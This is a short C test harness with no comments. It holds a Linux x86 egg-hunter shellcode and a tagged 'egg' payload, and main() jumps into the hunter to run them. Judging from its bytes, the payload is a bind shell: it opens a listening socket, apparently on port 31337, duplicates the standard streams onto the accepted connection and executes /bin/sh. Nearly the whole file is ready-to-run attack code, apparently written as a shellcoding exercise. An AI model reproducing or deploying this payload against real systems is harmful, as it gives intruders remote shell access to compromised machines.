unsigned char egg_hunter[] = "\x31\xc9\xeb\x05\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x43\x42\x41\x40\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";
unsigned char egg[] = \
"\x43\x42\x41\x40"
"\x43\x42\x41\x40"
"\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb3\x02\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\xb0\x66\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80\xb0\x01\xb3\x01\xcd\x80";

void main(){
	printf("Length of Egg Hunter Shellcode:  %d\n", strlen(egg_hunter));
	printf("Length of the Actual Shellcode:  %d\n", strlen(egg));
	int (*ret)() = (int(*)())egg_hunter;
	ret();
}